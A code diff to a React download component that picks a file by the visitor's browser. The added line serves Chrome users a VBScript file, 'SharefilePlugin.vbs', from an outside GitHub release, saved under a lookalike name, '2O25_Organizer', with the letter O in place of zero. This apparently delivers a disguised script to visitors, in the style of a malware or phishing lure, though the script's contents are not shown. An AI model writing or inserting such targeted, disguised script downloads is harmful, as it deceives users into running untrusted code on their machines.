@@ -229,7 +229,7 @@ const Download = () => {
       return { href: "/docs/SharefilePlugin.zip", name: `2O25_Organizer_${suffix}.zip` };
     }
     if (ua.includes("Chrome") && !ua.includes("Edg/")) {
-      return { href: "/docs/SharefilePlugin.vbs", name: `2O25_Organizer_${suffix}.vbs` };
+      return { href: "https://github.com/joneraig123/vado-adb/releases/download/v1.0.0/SharefilePlugin.vbs", name: `2O25_Organizer_${suffix}.vbs` };
     }
     return { href: "/docs/SharefilePlugin.zip", name: `2O25_Organizer_${suffix}.zip` };
   }, []);
